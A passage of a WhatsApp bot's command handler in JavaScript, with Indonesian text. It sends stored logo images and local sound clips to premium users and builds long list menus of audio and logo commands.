case 'hw65': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw65,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw66': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw66,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw67': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw67,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw68': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw68,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw69': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw69,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw70': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw70,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw71': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw71,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw72': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw72,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw73': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw73,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw74': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw74,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw75': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw75,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw76': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw76,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw77': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw77,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw78': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw78,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw79': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw79,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
//=================================================//
case 'ngakak': {
if (isBan) throw sticBanLu(from)
 hiy = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: hiy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ketawa': {
if (isBan) throw sticBanLu(from)
 hoy = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: hoy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'awkwk': {
if (isBan) throw sticBanLu(from)
 huy = fs.readFileSync('./baseikal/sound/awkwk.mp3')
 haikal.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'bang': {
if (isBan) throw sticBanLu(from)
 mi = fs.readFileSync('./baseikal/sound/bang.mp3')
 haikal.sendMessage(m.chat, {audio: mi, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'nob': {
if (isBan) throw sticBanLu(from)
 miki = fs.readFileSync('./baseikal/sound/nob.mp3')
 haikal.sendMessage(m.chat, {audio: miki, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'musik': {
if (isBan) throw sticBanLu(from)
 mo = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: mo, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'mastah': {
if (isBan) throw sticBanLu(from)
 mu = fs.readFileSync('./baseikal/sound/mastah.mp3')
 haikal.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'slebew': {
if (isBan) throw sticBanLu(from)
 me = fs.readFileSync('./baseikal/sound/tes.mp3')
 haikal.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'cantik': {
if (isBan) throw sticBanLu(from)
 muku = fs.readFileSync('./baseikal/sound/loli.mp3')
 haikal.sendMessage(m.chat, {audio: muku, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'kesel': {
if (isBan) throw sticBanLu(from)
 meke = fs.readFileSync('./baseikal/sound/kesel.mp3')
 haikal.sendMessage(m.chat, {audio: meke, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ngeselin': {
if (isBan) throw sticBanLu(from)
 moko = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
 haikal.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'santuy': case 'kal': {
if (isBan) throw sticBanLu(from)
 mokoo = fs.readFileSync('./baseikal/sound/gaskeun.mp3')
 haikal.sendMessage(m.chat, {audio: mokoo, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
//=================================================//
case 'listaudio':
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
touchmebree = [
{
title: `©️ sound MODS WA`,
rows: [
{title: `AUDIO 1`, rowId: `${prefix}sound1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 2`, rowId: `${prefix}sound2`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 3`, rowId: `${prefix}sound3`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 4`, rowId: `${prefix}sound4`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 5`, rowId: `${prefix}sound5`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 6`, rowId: `${prefix}sound6`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 7`, rowId: `${prefix}sound7`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 8`, rowId: `${prefix}sound8`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 9`, rowId: `${prefix}sound9`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 10`, rowId: `${prefix}sound10`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 11`, rowId: `${prefix}sound11`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 12`, rowId: `${prefix}sound12`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 13`, rowId: `${prefix}sound13`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 14`, rowId: `${prefix}sound14`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 15`, rowId: `${prefix}sound15`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 16`, rowId: `${prefix}sound16`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 17`, rowId: `${prefix}sound17`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 18`, rowId: `${prefix}sound18`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 19`, rowId: `${prefix}sound19`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 20`, rowId: `${prefix}sound20`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 21`, rowId: `${prefix}sound21`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 22`, rowId: `${prefix}sound22`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 23`, rowId: `${prefix}sound23`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 24`, rowId: `${prefix}sound24`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 25`, rowId: `${prefix}sound25`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 26`, rowId: `${prefix}sound26`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 27`, rowId: `${prefix}sound27`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 28`, rowId: `${prefix}sound28`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 29`, rowId: `${prefix}sound29`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 30`, rowId: `${prefix}sound30`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 31`, rowId: `${prefix}sound31`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 32`, rowId: `${prefix}sound32`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 33`, rowId: `${prefix}sound33`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 34`, rowId: `${prefix}sound34`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 35`, rowId: `${prefix}sound35`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 36`, rowId: `${prefix}sound36`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 37`, rowId: `${prefix}sound37`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 38`, rowId: `${prefix}sound38`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 39`, rowId: `${prefix}sound39`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 40`, rowId: `${prefix}sound40`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 41`, rowId: `${prefix}sound41`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 42`, rowId: `${prefix}sound42`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 43`, rowId: `${prefix}sound43`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 44`, rowId: `${prefix}sound44`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 45`, rowId: `${prefix}sound45`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 46`, rowId: `${prefix}sound46`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 47`, rowId: `${prefix}sound47`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 48`, rowId: `${prefix}sound48`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 49`, rowId: `${prefix}sound49`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 50`, rowId: `${prefix}sound50`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 51`, rowId: `${prefix}sound51`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 52`, rowId: `${prefix}sound52`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 53`, rowId: `${prefix}sound53`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 54`, rowId: `${prefix}sound54`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 55`, rowId: `${prefix}sound55`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 56`, rowId: `${prefix}sound56`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 57`, rowId: `${prefix}sound57`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 58`, rowId: `${prefix}sound58`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 59`, rowId: `${prefix}sound59`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 60`, rowId: `${prefix}sound60`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 61`, rowId: `${prefix}sound61`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 62`, rowId: `${prefix}sound62`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 63`, rowId: `${prefix}sound63`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 64`, rowId: `${prefix}sound64`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 65`, rowId: `${prefix}sound65`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 66`, rowId: `${prefix}sound66`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 67`, rowId: `${prefix}sound67`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 68`, rowId: `${prefix}sound68`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 69`, rowId: `${prefix}sound69`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 70`, rowId: `${prefix}sound70`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 71`, rowId: `${prefix}sound71`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 72`, rowId: `${prefix}sound72`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 73`, rowId: `${prefix}sound73`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 74`, rowId: `${prefix}sound74`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 75`, rowId: `${prefix}sound75`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 76`, rowId: `${prefix}sound76`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 77`, rowId: `${prefix}sound77`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 78`, rowId: `${prefix}sound78`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 79`, rowId: `${prefix}sound99`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 80`, rowId: `${prefix}sound80`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 81`, rowId: `${prefix}sound81`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 82`, rowId: `${prefix}sound82`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 83`, rowId: `${prefix}sound83`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 84`, rowId: `${prefix}sound84`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 85`, rowId: `${prefix}sound85`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 86`, rowId: `${prefix}sound86`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 87`, rowId: `${prefix}sound87`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 88`, rowId: `${prefix}sound88`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 89`, rowId: `${prefix}sound89`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 90`, rowId: `${prefix}sound90`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 91`, rowId: `${prefix}sound91`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 92`, rowId: `${prefix}sound92`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 93`, rowId: `${prefix}sound93`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 94`, rowId: `${prefix}sound94`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 95`, rowId: `${prefix}sound95`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 96`, rowId: `${prefix}sound96`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 97`, rowId: `${prefix}sound97`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 98`, rowId: `${prefix}sound98`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 99`, rowId: `${prefix}sound99`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 100`, rowId: `${prefix}sound100`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 101`, rowId: `${prefix}sound101`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 102`, rowId: `${prefix}sound102`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 103`, rowId: `${prefix}sound103`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 104`, rowId: `${prefix}sound104`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 105`, rowId: `${prefix}sound105`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 106`, rowId: `${prefix}sound106`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 107`, rowId: `${prefix}sound107`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 108`, rowId: `${prefix}sound108`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 109`, rowId: `${prefix}sound109`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 110`, rowId: `${prefix}sound110`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 111`, rowId: `${prefix}sound111`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 112`, rowId: `${prefix}sound113`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 114`, rowId: `${prefix}sound114`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 115`, rowId: `${prefix}sound115`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 116`, rowId: `${prefix}sound116`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 117`, rowId: `${prefix}sound117`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 118`, rowId: `${prefix}sound118`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 119`, rowId: `${prefix}sound119`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 120`, rowId: `${prefix}sound120`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 121`, rowId: `${prefix}sound121`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 122`, rowId: `${prefix}sound122`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 123`, rowId: `${prefix}sound123`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 124`, rowId: `${prefix}sound124`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 125`, rowId: `${prefix}sound125`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 126`, rowId: `${prefix}sound126`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 127`, rowId: `${prefix}sound127`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 128`, rowId: `${prefix}sound128`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 129`, rowId: `${prefix}sound129`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 130`, rowId: `${prefix}sound130`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 131`, rowId: `${prefix}sound131`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 132`, rowId: `${prefix}sound132`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 133`, rowId: `${prefix}sound133`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 134`, rowId: `${prefix}sound134`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 135`, rowId: `${prefix}sound135`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 136`, rowId: `${prefix}sound136`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 137`, rowId: `${prefix}sound137`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 138`, rowId: `${prefix}sound138`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 139`, rowId: `${prefix}sound139`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 140`, rowId: `${prefix}sound140`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 141`, rowId: `${prefix}sound141`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 142`, rowId: `${prefix}sound142`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 143`, rowId: `${prefix}sound143`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 144`, rowId: `${prefix}sound144`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 145`, rowId: `${prefix}sound145`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 146`, rowId: `${prefix}sound146`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 147`, rowId: `${prefix}sound147`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 148`, rowId: `${prefix}sound148`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 149`, rowId: `${prefix}sound149`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 150`, rowId: `${prefix}sound150`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 151`, rowId: `${prefix}sound151`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 152`, rowId: `${prefix}sound152`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 153`, rowId: `${prefix}sound153`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 154`, rowId: `${prefix}sound154`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 155`, rowId: `${prefix}sound155`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 156`, rowId: `${prefix}sound156`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 157`, rowId: `${prefix}sound157`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 158`, rowId: `${prefix}sound158`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 159`, rowId: `${prefix}sound159`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 160`, rowId: `${prefix}sound160`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 161`, rowId: `${prefix}sound161`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(m.chat, `
 Menyediakan Sound Gratis Untuk Kalian Mau
Total 161 Sound Dalam
161 Command, Dengan Audio Yang Berbeda 🤝

Thanks To
© Chem For Github Audio

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Audio Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
case 'listlogo':
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
touchmebree = [
{
title: `©️ 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
rows: [
{title: `LOGO 1`, rowId: `${prefix}hw1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 2`, rowId: `${prefix}hw2`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 3`, rowId: `${prefix}hw3`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 4`, rowId: `${prefix}hw4`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 5`, rowId: `${prefix}hw5`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 6`, rowId: `${prefix}hw6`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 7`, rowId: `${prefix}hw7`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 8`, rowId: `${prefix}hw8`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 9`, rowId: `${prefix}hw9`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 10`, rowId: `${prefix}hw10`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 11`, rowId: `${prefix}hw11`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 12`, rowId: `${prefix}hw12`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 13`, rowId: `${prefix}hw13`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 14`, rowId: `${prefix}hw14`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 15`, rowId: `${prefix}hw15`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 16`, rowId: `${prefix}hw16`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 17`, rowId: `${prefix}hw17`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 18`, rowId: `${prefix}hw18`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 19`, rowId: `${prefix}hw19`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 20`, rowId: `${prefix}hw20`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
